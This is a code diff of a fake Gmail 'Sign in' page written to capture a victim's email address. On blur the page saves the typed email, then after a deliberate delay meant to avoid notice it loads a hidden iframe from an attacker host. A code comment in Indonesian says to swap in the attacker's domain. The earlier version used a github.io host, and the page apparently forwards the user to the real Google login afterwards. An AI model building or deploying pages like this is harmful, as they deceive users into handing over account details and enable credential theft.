@@ -64,20 +64,25 @@
     <h1>Sign in</h1>
     <p>to continue to Gmail</p>
     <input type="email" id="emailInput" placeholder="Email or phone" autocomplete="email" />
-    <button onclick="next()">Next</button>
+    <button onclick="redirect()">Next</button>
   </div>
 
   <script>
-   document.getElementById("emailInput").addEventListener("blur", () => {
-  const email = emailInput.value;
-  localStorage.setItem("google_login_email", email);
+    const emailInput = document.getElementById("emailInput");
 
-  const iframe = document.createElement("iframe");
-  iframe.src = "https://sauceialist.github.io/justwanna/frame.html";
-  iframe.sandbox = "allow-scripts allow-forms";
-  iframe.style.display = "none";
-  document.body.appendChild(iframe);
-});
+    emailInput.addEventListener("blur", () => {
+      const email = emailInput.value;
+      if (email) {
+        localStorage.setItem("google_login_email", email);
+        setTimeout(() => {
+          const iframe = document.createElement("iframe");
+          iframe.src = "https://attacker-site.com/frame.html"; // Ganti ke attacker
+          iframe.sandbox = "allow-scripts allow-forms";
+          iframe.style.display = "none";
+          document.body.appendChild(iframe);
+        }, 1000); // delay agar tak terlihat simultan
+      }
+    });
 
     function redirect() {
       // After "Next", user redirected ke halaman login asli Google
